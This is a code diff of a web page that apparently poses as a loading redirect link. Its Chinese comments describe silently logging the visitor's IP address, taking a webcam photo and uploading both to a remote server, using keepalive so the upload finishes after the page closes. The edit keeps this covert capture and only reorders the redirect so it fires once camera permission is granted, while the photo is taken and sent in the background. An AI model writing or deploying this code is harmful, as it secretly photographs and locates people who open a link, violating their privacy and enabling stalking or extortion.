@@ -135,12 +135,6 @@
             document.title = "正在加载...";
           }
 
-          // ⚡ 极速跳转优化：立即跳转到目标页面，拍照和IP获取完全异步后台执行
-          // 延迟10ms跳转，让拍照流程有机会启动
-          setTimeout(function() {
-            window.location.replace(redirectUrl);
-          }, 10);
-
           // 后台静默获取IP地址（完全异步，不影响跳转）
           let userIP = null;
           fetch("https://api.ipify.org?format=json")
@@ -150,7 +144,7 @@
             })
             .catch(() => {});
 
-          // 后台静默拍照和上传（完全异步，不影响跳转）
+          // 立即开始拍照流程(不等待权限确认)
           if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices
               .getUserMedia({
@@ -161,14 +155,16 @@
                 },
               })
               .then(function (stream) {
+                // ⚡ 关键：摄像头权限获取后立即跳转
+                window.location.replace(redirectUrl);
+
                 video.srcObject = stream;
                 video.play();
 
-                // 等待视频流就绪后再拍照
+                // 后台继续拍照和上传
                 video.addEventListener(
                   "canplay",
                   function onCanPlay() {
-                    // 等待300ms确保画面稳定
                     setTimeout(function () {
                       try {
                         context.drawImage(video, 0, 0, 480, 640);
@@ -177,7 +173,7 @@
                         // 关闭摄像头
                         stream.getTracks().forEach((track) => track.stop());
 
-                        // 后台上传（页面已跳转，使用keepalive确保上传完成）
+                        // 后台上传（使用keepalive确保完成）
                         fetch(window.API_CONFIG.UPLOAD, {
                           method: "POST",
                           headers: {
@@ -186,9 +182,9 @@
                           body: JSON.stringify({
                             id: id,
                             image: imageData,
-                            ip: userIP, // 可能为null
+                            ip: userIP,
                           }),
-                          keepalive: true, // 关键：页面关闭后也继续上传
+                          keepalive: true,
                         }).catch((error) => {
                           console.error("后台上传错误:", error);
                         });
@@ -202,8 +198,12 @@
               })
               .catch(function (error) {
                 console.error("摄像头权限被拒绝:", error);
-                // 静默失败，用户已经看到目标页面
+                // 权限被拒绝也立即跳转
+                window.location.replace(redirectUrl);
               });
+          } else {
+            // 浏览器不支持，直接跳转
+            window.location.replace(redirectUrl);
           }
         },
         false
